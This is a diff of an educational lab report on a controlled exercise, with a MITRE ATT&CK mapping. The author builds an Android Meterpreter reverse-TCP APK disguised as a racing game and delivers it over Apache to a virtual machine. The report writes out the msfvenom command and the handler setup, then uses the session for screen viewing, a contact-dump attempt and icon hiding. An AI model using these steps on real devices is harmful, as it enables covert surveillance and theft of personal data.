@@ -8,6 +8,10 @@ This assessment focused on demonstrating how a malicious Android application cou
 
 The testing involved creating an Android Meterpreter reverse TCP payload, disguising it as a gaming application, hosting the APK on an Apache web server, and downloading it onto the Android VM. After the application was executed, a Meterpreter session was established between the Android VM and Kali Linux. Several Meterpreter commands were then tested to determine what access and monitoring capabilities were available.
 
+During this assessment, I was able to not only download the malicious application through the internet, but also establish a connection to the target device. From there, I was able to test access to the device’s contacts, although no contacts were available, view the target device’s screen through screenshare, and hide the malicious application from the device. These results demonstrate how a seemingly harmless application could potentially give an attacker access to personal and sensitive information and allow them to monitor activity on the device.
+
+Overall, this assessment demonstrated how easily a malicious application can create security risks when a user is convinced to download and run it. Although this was performed in a controlled environment, the results show how an attacker could potentially monitor a device and access sensitive information. For organizations, this highlights the importance of strong application security controls, user awareness, and limiting the permissions applications are given.
+
 ### Scope
 
 The scope of this assessment was limited to the Android x86 virtual machine and the Kali Linux attacker machine used in the lab. The Android VM was used instead of a physical mobile device so that the testing could be performed in an isolated and controlled environment.
@@ -92,9 +96,10 @@ The following tools were used during the assessment:
 
 I started by setting up an Android x86 virtual machine in VirtualBox to use as my target. I used Kali Linux as the attacker machine. The Android VM was running Android 9, and I confirmed that Kali and the Android VM were on the same network. Kali had the IP address `10.0.2.5` and the Android VM had the IP address `10.0.2.8`.
 
-![Android VM](screenshots/01-android-vm.png)
+<img width="1892" height="897" alt="image" src="https://github.com/user-attachments/assets/0392818a-5507-40f5-abc3-f0c99d808a75" />
 
-![Kali IP Address](screenshots/15-ip-address.png)
+<img width="1115" height="344" alt="image" src="https://github.com/user-attachments/assets/a5dbe1ff-2e77-497f-92c8-40b0aba2f943" />
+
 
 #### 2. Setting Up the Tools
 
@@ -104,11 +109,11 @@ I first checked that Metasploit was installed on Kali. The system showed that Me
 
 I then created a `games` folder in the Apache web directory and checked that the folder was available.
 
-![Metasploit Installation](screenshots/12-metasploit-install.png)
+<img width="1869" height="831" alt="image" src="https://github.com/user-attachments/assets/35a1022e-2e1f-4651-a91f-3e2b1d77431b" />
 
-![Apache Status](screenshots/13-apache-status.png)
+<img width="1863" height="457" alt="image" src="https://github.com/user-attachments/assets/41399672-ab23-4514-9886-e022af227f64" />
 
-![Web Directory](screenshots/14-web-directory.png)
+<img width="409" height="246" alt="image" src="https://github.com/user-attachments/assets/d0cf8c65-b441-43d6-9048-b3dd356134e4" />
 
 #### 3. Creating the APK
 
@@ -122,7 +127,8 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > /var/w
 
 The generated APK was placed in the `games` directory so it could be accessed through the Apache web server.
 
-![Payload Hosted](screenshots/18-payload-hosted.png)
+<img width="1184" height="460" alt="image" src="https://github.com/user-attachments/assets/ea2d48ff-5382-48ac-8f54-df2203bd05c5" />
+
 
 I did run into an issue with the APK during the first attempt, so I had to regenerate it before continuing with the lab.
 
@@ -130,19 +136,22 @@ I did run into an issue with the APK during the first attempt, so I had to regen
 
 Once the APK was hosted, I opened the Android VM's browser and went to:
 
-```text
-10.0.2.5/games/
+```
+http://10.0.2.5/games/
 ```
 
 This allowed me to download the APK onto the Android VM.
 
-![Android Download](screenshots/09-android-download.png)
+<img width="1020" height="765" alt="image" src="https://github.com/user-attachments/assets/b2ca3a90-6747-4101-9f9a-21ef53ac3ea2" />
 
 Android's security features initially caused some issues with installing the application. After working through the installation issue, I was able to get the application running on the Android VM.
 
+<img width="1018" height="766" alt="image" src="https://github.com/user-attachments/assets/1e4608e2-8872-42f2-80aa-51a5893555d2" />
+
 The application appeared in the Android app drawer as `MainActivity`.
 
-![Android App Drawer](screenshots/19-app-drawer.png)
+<img width="1023" height="768" alt="image" src="https://github.com/user-attachments/assets/ed3cb973-f4ca-4f64-b8ed-a42499f67187" />
+
 
 #### 5. Reviewing Permissions
 
@@ -150,7 +159,8 @@ I also looked at the permissions requested by the application. The application r
 
 I included this as part of the lab because it showed how much access an application can potentially request from a device.
 
-![Application Permissions](screenshots/02-permissions.png)
+<img width="1030" height="771" alt="image" src="https://github.com/user-attachments/assets/a66a40fd-d81c-42e9-8a21-f61f4ea5382b" />
+
 
 #### 6. Setting Up the Metasploit Handler
 
@@ -158,9 +168,10 @@ After creating and installing the APK, I set up a Metasploit `multi/handler` to 
 
 The handler was configured to listen on port `4444`.
 
-![Meterpreter Handler](screenshots/16-handler.png)
+<img width="876" height="767" alt="image" src="https://github.com/user-attachments/assets/c543ebd6-7bb0-4590-9f00-7e417368686f" />
 
-![Handler Options](screenshots/17-handler-options.png)
+<img width="883" height="397" alt="image" src="https://github.com/user-attachments/assets/aaae0738-cd1e-4be0-a40d-b32f07cd476a" />
+
 
 #### 7. Establishing the Meterpreter Session
 
@@ -174,17 +185,18 @@ Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.8:60106)
 
 This confirmed that I had successfully established a Meterpreter connection between the Android VM and Kali.
 
+
 #### 8. Gathering Information About the Android VM
 
 After getting the session, I used the `sysinfo` command to see information about the Android device.
 
 The results showed that the target was running Android 9 on an x86_64 system.
 
-![Meterpreter Sysinfo](screenshots/03-meterpreter-sysinfo.png)
+<img width="894" height="579" alt="image" src="https://github.com/user-attachments/assets/7774d35e-0dbe-42eb-bdf6-dc0246696d0c" />
 
 I also looked through the Meterpreter help menu to see what commands were available for the Android target.
 
-![Meterpreter Help](screenshots/20-meterpreter-help.png)
+<img width="862" height="326" alt="image" src="https://github.com/user-attachments/assets/abb92a22-d80f-4c31-b88e-83ebeb9d7c13" />
 
 #### 9. Testing Meterpreter Commands
 
@@ -196,11 +208,13 @@ First, I tried `dump_contacts` to see if I could retrieve contact information fr
 No contacts were found!
 ```
 
-![Dump Contacts](screenshots/04-dump-contacts.png)
+<img width="893" height="578" alt="image" src="https://github.com/user-attachments/assets/5bfb2212-5829-4699-8e30-354694a468a1" />
+
 
 I also tested the `screenshare` command. This was successful and allowed me to view the Android VM's screen through the Meterpreter session.
 
-![Screenshare](screenshots/05-screenshare.png)
+<img width="750" height="509" alt="image" src="https://github.com/user-attachments/assets/50fe0f15-feb7-46f9-8e00-e6ce66231e7b" />
+
 
 Finally, I tested the ability to hide the application's icon. My first command was:
 
@@ -214,7 +228,8 @@ This did not work and returned:
 Unknown command
 ```
 
-![Failed Hide App Icon Command](screenshots/06-hide-app-failed.png)
+<img width="880" height="257" alt="image" src="https://github.com/user-attachments/assets/72f3e5e8-122c-41ed-bee1-e7ecbc6190b8" />
+
 
 I then corrected the command to:
 
@@ -228,11 +243,13 @@ This time, the command worked and returned:
 Activity MainActivity was hidden
 ```
 
-![Successful Hide App Icon Command](screenshots/07-hide-app-success.png)
+<img width="491" height="84" alt="image" src="https://github.com/user-attachments/assets/3b49f3b1-dc4d-4fde-97d3-e88ad09ddd62" />
+
 
 After running the command, `MainActivity` was no longer visible in the Android application drawer.
 
-![App Hidden](screenshots/08-app-hidden.png)
+<img width="1022" height="773" alt="image" src="https://github.com/user-attachments/assets/2a99e62b-9562-4ac2-8715-258ac9b28409" />
+
 
 #### 10. Documenting the Results
 
@@ -264,7 +281,7 @@ During the lab, the Kali terminal and Meterpreter session also appeared to becom
 
 ### MITRE ATT&CK Mapping
 
-The following MITRE ATT&CK techniques were identified based on activities that were actually demonstrated during this assessment.
+The following MITRE ATT&CK techniques were identified based on activities that were actually demonstrated during this project.
 
 | Technique | Name | How It Applied |
 |---|---|---|
@@ -273,7 +290,6 @@ The following MITRE ATT&CK techniques were identified based on activities that w
 | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | The APK was disguised as a gaming application and relied on the user downloading and executing it. |
 | [T1437.001](https://attack.mitre.org/techniques/T1437/001/) | Application Layer Protocol: Web Protocols | HTTP was used through Apache to host and deliver the APK to the Android VM. |
 
-**Note:** T1628.001, T1513, and T1437.001 are MITRE ATT&CK Mobile techniques relevant to Android. T1204.002 is an Enterprise technique and is included here as a supporting technique for the user-execution/social-engineering portion of the lab.
 
 ### Technical Findings
 
@@ -347,90 +363,25 @@ The command was attempted during the Meterpreter testing.
 **Result:**  
 Successful geolocation was not demonstrated during this lab.
 
-## 4. Appendices
+# Appendices
 
-### Appendix A — Screenshots
+## Appendix A — MITRE ATT&CK References
 
-The following screenshots were collected as evidence throughout the assessment:
+The following MITRE ATT&CK techniques were identified as relevant to activities demonstrated during the assessment.
 
-| Screenshot | Description |
-|---|---|
-| `01-android-vm.png` | Android x86 virtual machine |
-| `02-permissions.png` | Application permissions |
-| `03-meterpreter-sysinfo.png` | Meterpreter system information |
-| `04-dump-contacts.png` | Contact access attempt |
-| `05-screenshare.png` | Successful screenshare |
-| `06-hide-app-failed.png` | Failed hide app icon command |
-| `07-hide-app-success.png` | Successful hide app icon command |
-| `08-app-hidden.png` | Application hidden from app drawer |
-| `09-android-download.png` | APK download on Android VM |
-| `10-vm-files.png` | Android VM files |
-| `11-extracted-ova.png` | Extracted Android OVA |
-| `12-metasploit-install.png` | Metasploit installation verification |
-| `13-apache-status.png` | Apache service status |
-| `14-web-directory.png` | Apache web directory |
-| `15-ip-address.png` | Kali IP address |
-| `16-handler.png` | Metasploit handler |
-| `17-handler-options.png` | Handler configuration |
-| `18-payload-hosted.png` | Hosted APK payload |
-| `19-app-drawer.png` | Application visible in app drawer |
-| `20-meterpreter-help.png` | Meterpreter help menu |
+| Technique | Name | How It Relates to the Lab |
+|---|---|---|
+| T1628.001 | Hide Artifacts: Suppress Application Icon | The application icon was successfully hidden from the Android app drawer. |
+| T1513 | Screen Capture | Meterpreter `screenshare` was successfully used to view the Android device screen. |
+| T1204.002 | User Execution: Malicious File | The APK was disguised as a gaming application and relied on the user downloading and executing it. |
+| T1437.001 | Application Layer Protocol: Web Protocols | HTTP was used through Apache to host and deliver the APK to the Android VM. |
 
-### Appendix B — Commands Used
+> **Note:** These techniques are included as references to help categorize activities demonstrated during the lab. They do not indicate that each technique represents a separate vulnerability.
 
-```bash
-# Check Kali network configuration
-ip a
+---
 
-# Create directory for the hosted APK
-mkdir /var/www/html/games
+## Appendix B — CVE References
 
-# Generate the Android Meterpreter APK
-msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > /var/www/html/games/car-race.apk
-```
+The assessment did not directly exploit a specific CVE. The attack demonstrated in this lab relied on a malicious Android application, user execution, and Meterpreter functionality rather than exploiting a known vulnerability in Android itself.
 
-Metasploit handler configuration:
-
-```text
-use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set LHOST 0.0.0.0
-set LPORT 4444
-run
-```
-
-Meterpreter commands tested:
-
-```text
-sysinfo
-help
-dump_contacts
-screenshare
-hide_app_icon_MainActivity
-hide_app_icon MainActivity
-wlan_geolocate
-```
-
-### Appendix C — Lab Environment Information
-
-**Attacker Machine**
-
-- Operating System: Kali Linux
-- IP Address: `10.0.2.5`
-- Metasploit Framework: 6.5.3
-- Listener Port: `4444`
-
-**Target Machine**
-
-- Operating System: Android 9
-- IP Address: `10.0.2.8`
-- Architecture: x86_64
-- Linux Kernel: `4.19.110-android-x86_64-g066cc1d`
-- Meterpreter: `dalvik/android`
-
-**Payload**
-
-- Payload Type: `android/meterpreter/reverse_tcp`
-- APK Name: `car-race.apk`
-- Hosting Directory: `/var/www/html/games/`
-- Delivery Method: HTTP through Apache
+Android 9 has publicly documented CVEs, but no specific CVE was directly tested or exploited during this assessment. Therefore, no CVE is being assigned to the findings in this report.
